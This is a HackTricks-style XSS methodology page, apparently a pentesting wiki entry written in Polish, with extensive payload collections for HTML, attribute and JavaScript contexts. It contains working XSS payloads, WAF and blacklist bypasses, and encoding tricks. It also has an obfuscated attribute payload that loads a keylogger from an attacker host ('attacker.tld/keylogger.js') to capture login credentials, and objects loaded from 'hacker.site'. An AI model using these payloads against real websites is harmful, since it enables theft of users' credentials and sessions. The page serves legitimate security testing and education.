# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Sprawdź, czy **jakakolwiek wartość, którą kontrolujesz** (_parametry_, _path_, _headers_?, _cookies_?) jest **odbijana** w HTML lub **używana** przez kod **JS**.
2. **Znajdź kontekst**, w którym jest odbijana/używana.
3. Jeśli jest **odbita**
1. Sprawdź, **jakie symbole możesz użyć** i w zależności od tego przygotuj payload:
1. W **surowym HTML**:
1. Czy możesz tworzyć nowe tagi HTML?
2. Czy możesz użyć eventów lub atrybutów obsługujących protokół `javascript:`?
3. Czy możesz obejść zabezpieczenia?
4. Czy zawartość HTML jest interpretowana przez jakiś client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), który możesz wykorzystać przez [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Jeśli nie możesz stworzyć tagów HTML wykonujących kod JS, czy możesz wykorzystać [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Wewnątrz **atrybutu tagu HTML**:
1. Czy możesz wydostać się do surowego kontekstu HTML?
2. Czy możesz stworzyć nowe eventy/atrybuty wykonujące kod JS?
3. Czy atrybut, w którym utknąłeś, wspiera wykonanie JS?
4. Czy możesz obejść zabezpieczenia?
3. Wewnątrz **kodu JavaScript**:
1. Czy możesz uciec z tagu `<script>`?
2. Czy możesz uciec z łańcucha i wykonać inny kod JS?
3. Czy Twoje dane są w template literals \`\`?
4. Czy możesz obejść zabezpieczenia?
4. Funkcja JavaScript **bywa wywoływana**
1. Możesz wskazać nazwę funkcji do wykonania, np.: `?callback=alert(1)`
4. Jeśli jest **używane**:
1. Możesz eksploatować **DOM XSS**, zwróć uwagę, w jaki sposób Twoje dane są kontrolowane i czy Twoje **kontrolowane dane są użyte przez jakikolwiek sink.**

Pracując nad złożonym XSS może być przydatne zapoznanie się z:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Wartości odbite

Aby skutecznie wykorzystać XSS, pierwszą rzeczą, którą musisz znaleźć, jest **wartość kontrolowana przez Ciebie, która jest odbijana** na stronie.

- **Odbite pośrednio**: Jeśli odkryjesz, że wartość parametru lub nawet ścieżka jest odbijana na stronie, możesz wykorzystać **Reflected XSS**.
- **Zapisane i odbijane**: Jeśli znajdziesz wartość kontrolowaną przez Ciebie, która jest zapisywana na serwerze i odbijana przy każdym dostępie do strony, możesz wykorzystać **Stored XSS**.
- **Dostępne przez JS**: Jeśli znajdziesz wartość kontrolowaną przez Ciebie, do której dostęp uzyskuje JS, możesz wykorzystać **DOM XSS**.

## Konteksty

Przy próbie wykorzystania XSS, pierwsze co musisz wiedzieć to **gdzie twoje dane wejściowe są odbijane**. W zależności od kontekstu będziesz mógł wykonać dowolny kod JS na różne sposoby.

### Surowy HTML

Jeśli Twoje dane wejściowe są **odbijane w surowym HTML** strony, będziesz musiał nadużyć jakiegoś **tagu HTML**, aby wykonać kod JS: `<img , <iframe , <svg , <script` ... to tylko niektóre z wielu możliwych tagów HTML, których możesz użyć.\
Również miej na uwadze [Client Side Template Injection](../client-side-template-injection-csti.md).

### W atrybucie tagu HTML

Jeśli Twoje dane są odbijane wewnątrz wartości atrybutu tagu, możesz spróbować:

1. **Uciec z atrybutu i z tagu** (wtedy znajdziesz się w surowym HTML) i utworzyć nowy tag HTML do nadużycia: `"><img [...]`
2. Jeśli **możesz uciec z atrybutu, ale nie z tagu** (`>` jest zakodowane lub usunięte), w zależności od tagu możesz **stworzyć event**, który wykona kod JS: `" autofocus onfocus=alert(1) x="`
3. Jeśli **nie możesz uciec z atrybutu** (`"` jest kodowane lub usuwane), to w zależności od **którego atrybutu** dotyczy odbicie oraz **czy kontrolujesz całą wartość czy tylko jej część**, będziesz mógł go wykorzystać. Na **przykład**, jeśli kontrolujesz event taki jak `onclick=` będziesz w stanie wykonać dowolny kod po kliknięciu. Innym interesującym **przykładem** jest atrybut `href`, gdzie możesz użyć protokołu `javascript:`, aby wykonać kod: **`href="javascript:alert(1)"`**
4. Jeśli Twoje dane są odbijane wewnątrz tagów, które trudno eksploatować, możesz spróbować sztuczki z **`accesskey`**, aby wykorzystać podatność (będziesz potrzebować pewnej formy social engineeringu): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

Strona logowania SSO w korporacji odbijała parametr OAuth `service` wewnątrz atrybutu `href` elementu `<a id="forgot_btn" ...>`. Chociaż `<` i `>` były HTML-enkodowane, cudzysłowy nie, więc atakujący mógł zamknąć atrybut i ponownie użyć tego samego elementu, by wstrzyknąć handlery takie jak `" onfocus="payload" x="`.

1. **Wstrzyknięcie handlera:** Proste payloady jak `onclick="print(1)"` były blokowane, ale WAF inspekcjonował tylko pierwsze wyrażenie JavaScript w inline atrybutach. Prefiksowanie niewinnego wyrażenia w nawiasach, a następnie średnika, pozwoliło na wykonanie rzeczywistego payloadu: `onfocus="(history.length);malicious_code_here"`.
2. **Automatyczne wyzwolenie:** Przeglądarki fokusują element, którego `id` odpowiada fragmentowi w URL, więc dopisanie `#forgot_btn` do URL-a exploita wymusza fokus na anchorze przy załadowaniu strony i uruchamia handler bez konieczności kliknięcia.
3. **Utrzymaj inline stub mały:** Cel już ładował jQuery. Handler potrzebował tylko zainicjować żądanie przez `$.getScript(...)`, podczas gdy pełny keylogger był hostowany na serwerze atakującego.

**Budowanie stringów bez cudzysłowów**

Pojedyncze cudzysłowy były zwracane URL-enkodowane, a escaped podwójne cudzysłowy korumpowały atrybut, więc payload generował każdy string za pomocą `String.fromCharCode`. Funkcja pomocnicza ułatwia konwersję dowolnego URL-a na kody znaków przed wklejeniem go do atrybutu:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Wynikowy atrybut wyglądał następująco:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Dlaczego to wykrada poświadczenia**

Zewnętrzny skrypt (ładowany z hosta kontrolowanego przez atakującego lub Burp Collaborator) podczepił `document.onkeypress`, buforował naciśnięcia klawiszy i co sekundę wykonywał `new Image().src = collaborator_url + keys`. Ponieważ XSS uruchamia się tylko dla niezalogowanych użytkowników, wrażliwą akcją jest sam formularz logowania — atakujący keylogs nazwy użytkowników i hasła, nawet jeśli ofiara nigdy nie naciśnie "Login".

Dziwny przykład Angulara wykonującego XSS, jeśli kontrolujesz nazwę klasy:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### W kodzie JavaScript

W tym przypadku twoje dane wejściowe są odzwierciedlane pomiędzy **`<script> [...] </script>`** tagami strony HTML, wewnątrz pliku `.js` lub wewnątrz atrybutu używającego protokołu **`javascript:`**:

- Jeśli odzwierciedlane pomiędzy **`<script> [...] </script>`** tagami, nawet jeśli twoje dane wejściowe są wewnątrz jakiegokolwiek typu cudzysłowu, możesz spróbować wstrzyknąć `</script>` i wydostać się z tego kontekstu. Działa to, ponieważ **przeglądarka najpierw sparsuje tagi HTML**, a dopiero potem zawartość, w związku z tym nie zauważy, że wstrzyknięty tag `</script>` znajduje się wewnątrz kodu HTML.
- Jeśli odzwierciedlane **wewnątrz JS stringa** i poprzedni trik nie działa, będziesz musiał **opuścić** string, **wykonać** swój kod i **odtworzyć** kod JS (jeśli wystąpi jakikolwiek błąd, nie zostanie on wykonany:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Jeśli odzwierciedlane wewnątrz template literals możesz **osadzić wyrażenia JS** używając składni `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Kodowanie Unicode** umożliwia napisanie **prawidłowego kodu javascript**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting odnosi się do możliwości **deklarowania funkcji, zmiennych lub klas po ich użyciu, dzięki czemu możesz wykorzystać scenariusze, w których XSS używa niezadeklarowanych zmiennych lub funkcji.**\
**Sprawdź następującą stronę po więcej informacji:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Na wielu stronach internetowych znajdują się endpointy, które **przyjmują jako parametr nazwę funkcji do wykonania**. Częstym przykładem spotykanym w naturze jest coś w stylu: `?callback=callbackFunc`.

Dobrym sposobem, żeby sprawdzić, czy coś przekazywane bezpośrednio przez użytkownika jest próbą wykonania, jest **zmodyfikowanie wartości parametru** (na przykład na 'Vulnerable') i sprawdzenie w konsoli błędów takich jak:

![](<../../images/image (711).png>)

Jeśli jest podatne, możesz być w stanie **wywołać alert**, po prostu wysyłając wartość: **`?callback=alert(1)`**. Jednak często takie endpointy **walidują zawartość**, aby zezwolić jedynie na litery, cyfry, kropki i podkreślenia (**`[\w\._]`**).

Nawet przy takim ograniczeniu wciąż można wykonać pewne akcje. Wynika to z faktu, że możesz użyć tych dozwolonych znaków, aby **dostępować się do dowolnego elementu w DOM**:

![](<../../images/image (747).png>)

Kilka przydatnych funkcji do tego:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Możesz też spróbować **uruchomić funkcje Javascript** bezpośrednio: `obj.sales.delOrders`.

Jednak zwykle endpointy wykonujące wskazaną funkcję to endpointy bez zbyt interesującego DOM, **inne strony w tej samej domenie (same origin)** będą miały **bardziej interesujący DOM** do wykonania większej liczby akcji.

W związku z tym, aby **wykorzystać tę podatność w innym DOM** opracowano metodę eksploatacji **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Istnieje **JS code** które w sposób **niebezpieczny** używa niektórych **danych kontrolowanych przez atakującego**, takich jak `location.href`. Atakujący może to wykorzystać do wykonania dowolnego kodu JS.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Tego typu XSS można znaleźć **wszędzie**. Nie zależą one tylko od eksploatacji po stronie klienta aplikacji webowej, lecz od **dowolnego** **kontekstu**. Tego rodzaju **arbitrary JavaScript execution** może nawet zostać wykorzystane do uzyskania **RCE**, **odczytu** **dowolnych** **plików** na klientach i serwerach, i więcej.\
Kilka **przykładów**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Kiedy Twój input jest odzwierciedlany **wewnątrz strony HTML** lub możesz uciec i wstrzyknąć kod HTML w tym kontekście, **pierwszą** rzeczą jaką musisz zrobić jest sprawdzić, czy możesz wykorzystać `<` do stworzenia nowych tagów: po prostu spróbuj **odzwierciedlić** ten **znak** i sprawdź, czy jest **HTML encoded** czy **usuwany** albo czy jest **odzwierciedlany bez zmian**. **Tylko w ostatnim przypadku będziesz w stanie to wykorzystać**.\
W takich przypadkach także **pamiętaj** o [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Uwaga: Komentarz HTML można zamknąć używając\*\***\***\*`-->`\*\***\***\*lub \*\***`--!>`\*\*_ 

W tym przypadku, i jeśli nie stosuje się black/whitelisting, możesz użyć payloadów takich jak:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Ale jeśli stosowany jest black/whitelisting tagów/atrybutów, będziesz musiał **brute-force określić, które tagi** możesz utworzyć.\
Gdy **zlokalizujesz, które tagi są dozwolone**, będziesz musiał **brute-force atrybuty/zdarzenia** wewnątrz znalezionych prawidłowych tagów, aby zobaczyć, jak możesz zaatakować kontekst.

### Brute-force tagów/zdarzeń

Przejdź do [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) i kliknij _**Kopiuj tagi do schowka**_. Następnie wyślij je wszystkie za pomocą Burp intruder i sprawdź, czy któryś z tagów nie został wykryty jako złośliwy przez WAF. Gdy odkryjesz, których tagów możesz użyć, możesz **brute-force wszystkich zdarzeń** używając prawidłowych tagów (na tej samej stronie kliknij _**Kopiuj zdarzenia do schowka**_ i postępuj tak samo jak wcześniej).

### Niestandardowe tagi

Jeśli nie znalazłeś żadnego prawidłowego tagu HTML, możesz spróbować **utworzyć niestandardowy tag** i wykonać kod JS za pomocą atrybutu `onfocus`. W żądaniu XSS musisz zakończyć URL znakiem `#`, aby strona **ustawiła fokus na tym obiekcie** i **wykonała** kod:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Jeśli używana jest jakaś blacklist, możesz spróbować ją obejść kilkoma głupimi sztuczkami:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Więcej tiny XSS dla różnych środowisk** payload [**można znaleźć tutaj**](https://github.com/terjanq/Tiny-XSS-Payloads) i [**tutaj**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Jeśli, aby wykorzystać podatność, potrzebujesz, żeby **user to click a link or a form** z wstępnie wypełnionymi danymi, możesz spróbować [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (if the page is vulnerable).

### Impossible - Dangling Markup

Jeśli myślisz, że **it's impossible to create an HTML tag with an attribute to execute JS code**, powinieneś sprawdzić [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)because możesz **exploit** the vulnerability **without** executing **JS** code.

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

Jeśli znajdujesz się **inside a HTML tag**, pierwszą rzeczą, którą możesz spróbować, jest **escape** from the tag i użyć niektórych technik wymienionych w [previous section](#injecting-inside-raw-html) aby wykonać JS code.\
Jeśli **cannot escape from the tag**, możesz stworzyć nowe atrybuty wewnątrz tagu, aby spróbować wykonać JS code, na przykład używając payloadu takiego jak (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Zdarzenia stylów**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Wewnątrz atrybutu

Nawet jeśli **nie możesz uciec z atrybutu** (`"` jest kodowany lub usuwany), w zależności od **którego atrybutu** Twoja wartość jest odzwierciedlana oraz **czy kontrolujesz całą wartość czy tylko jej część** będziesz w stanie to wykorzystać. Na **przykład**, jeśli kontrolujesz zdarzenie takie jak `onclick=` będziesz mógł spowodować wykonanie dowolnego kodu po kliknięciu.\
Innym ciekawym **przykładem** jest atrybut `href`, gdzie możesz użyć protokołu `javascript:` do wykonania dowolnego kodu: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Znaki **HTML encoded characters** wewnątrz wartości atrybutów tagów HTML są **dekodowane w czasie wykonywania**. Dlatego coś takiego będzie poprawne (payload jest pogrubiony): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Zauważ, że **dowolny rodzaj kodowania HTML jest akceptowany**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Zauważ, że URL encode również zadziała:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass wewnątrz zdarzenia przy użyciu kodowania Unicode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Specjalne protokoły w atrybucie

Tam możesz użyć protokołów **`javascript:`** lub **`data:`** w niektórych miejscach, aby **wykonać dowolny kod JS**. Niektóre będą wymagać interakcji użytkownika, inne nie.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Miejsca, w których możesz wstrzykiwać te protokoły**

**Ogólnie** protokół `javascript:` może być **użyty w dowolnym tagu, który akceptuje atrybut `href`** oraz w **większości** tagów, które akceptują **atrybut `src`** (ale nie `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Inne triki obfuskacji**

_**W tym przypadku HTML encoding oraz Unicode encoding z poprzedniej sekcji również mają zastosowanie, ponieważ znajdujesz się wewnątrz atrybutu.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Ponadto istnieje jeszcze jeden **fajny trik** w takich przypadkach: **Nawet jeśli twoje wejście wewnątrz `javascript:...` jest URL encoded, zostanie URL decoded zanim zostanie wykonane.** Zatem, jeśli musisz **escape** z **string** używając **single quote** i widzisz, że **to jest URL encoded**, pamiętaj, że **to nie ma znaczenia,** zostanie **zinterpretowane** jako **single quote** podczas **wykonywania**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Zauważ, że jeśli spróbujesz **użyć obu** `URLencode + HTMLencode` w dowolnej kolejności, aby zakodować **payload**, to **nie będzie** **działać**, ale możesz **mieszać je wewnątrz payload**.

**Używanie Hex and Octal encode z `javascript:`**

Możesz użyć **Hex** i **Octal encode** wewnątrz atrybutu `src` elementu `iframe` (przynajmniej), aby zadeklarować **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Jeśli możesz wstrzyknąć dowolny URL w dowolny znacznik **`<a href=`** który zawiera atrybuty **`target="_blank" and rel="opener"`**, sprawdź **następującą stronę, aby wykorzystać to zachowanie**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Omijanie "on" event handlers

Przede wszystkim sprawdź tę stronę ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) pod kątem przydatnych **"on" event handlers**.\
W przypadku gdy jakaś blacklist uniemożliwia utworzenie tych event handlerów, możesz spróbować następujących obejść:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS w "Unexploitable tags" (hidden input, link, canonical, meta)

Z [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **teraz można nadużyć hidden inputs za pomocą:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
A w **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Z [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Możesz wykonać **XSS payload inside a hidden attribute**, pod warunkiem że uda Ci się **namówić** **victim** do naciśnięcia **key combination**. W Firefox na Windows/Linux kombinacja klawiszy to **ALT+SHIFT+X**, a na OS X to **CTRL+ALT+X**. Możesz określić inną kombinację klawiszy, używając innego klawisza w access key attribute. Oto wektor:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Ładunek XSS będzie wyglądał mniej więcej tak: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Kilka tricków polegających na użyciu różnych kodowań zostało już omówionych w tej sekcji. Wróć, aby się nauczyć, gdzie możesz użyć:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Jeśli znalazłeś **XSS w bardzo małej części** strony, która wymaga jakiejś interakcji (może mały link w stopce z elementem onmouseover), możesz spróbować **zmodyfikować przestrzeń zajmowaną przez ten element**, aby zmaksymalizować prawdopodobieństwo wywołania linku.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

Now you can modify our link and bring it to the form

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

W takich przypadkach twoje **input** będzie **odbijane w kodzie JS** w pliku `.js` lub pomiędzy tagami `<script>...</script>`, albo pomiędzy HTML events, które mogą wykonywać kod JS, albo w atrybutach akceptujących protokół `javascript:`.

### Escaping \<script> tag

Jeśli twój kod zostanie wstawiony w obrębie `<script> [...] var input = 'reflected data' [...] </script>`, możesz łatwo **przerwać zamknięcie tagu `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Zauważ, że w tym przykładzie **nawet nie zamknęliśmy pojedynczego apostrofu**. Dzieje się tak, ponieważ **analiza HTML jest wykonywana najpierw przez przeglądarkę**, co obejmuje identyfikację elementów strony, włącznie z blokami skryptów. Analiza JavaScript w celu zrozumienia i wykonania osadzonych skryptów jest wykonywana dopiero później.

### Wewnątrz kodu JS

Jeśli `<>` są sanitizowane, nadal możesz **uciec z łańcucha**, w którym znajduje się twój input, i **wykonać dowolny JS**. Ważne jest, aby **naprawić składnię JS**, ponieważ jeśli wystąpią jakiekolwiek błędy, kod JS nie zostanie wykonany:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Kiedy dane wejściowe użytkownika trafiają do cytowanego łańcucha JavaScript (np. server-side echo into an inline script), możesz zakończyć łańcuch, wstrzyknąć kod i naprawić składnię, aby parsowanie pozostało poprawne. Ogólny szkielet:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Przykładowy wzorzec URL, gdy podatny parametr jest odzwierciedlany w ciągu JS:
```
?param=test";<INJECTION>;a="
```
To wykonuje attacker JS bez konieczności dotykania kontekstu HTML (czysty JS-in-JS). Połącz z blacklist bypasses poniżej, gdy filtry blokują keywords.

### Template literals ``

Aby konstruować **strings**, oprócz pojedynczych i podwójnych cudzysłowów JS akceptuje także **backticks** **` `` `**. To jest znane jako template literals, ponieważ pozwalają na **osadzanie wyrażeń JS** używając składni `${ ... }`.\  
Dlatego, jeśli twoje wejście jest **reflected** wewnątrz JS stringa używającego backticks, możesz nadużyć składni `${ ... }` aby wykonać **arbitrary JS code**:

To można **wykorzystać** używając:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Wykonanie zakodowanego kodu
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads z eval(atob()) i niuanse dotyczące zakresu

Aby skrócić adresy URL i obejść proste filtry słów-kluczy, możesz zakodować swoją rzeczywistą logikę w base64 i zinterpretować ją za pomocą `eval(atob('...'))`. Jeśli proste filtrowanie słów-kluczy blokuje identyfikatory takie jak `alert`, `eval` lub `atob`, użyj identyfikatorów zakodowanych jako Unicode-escape, które kompilują się identycznie w przeglądarce, ale omijają filtry dopasowujące ciągi:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
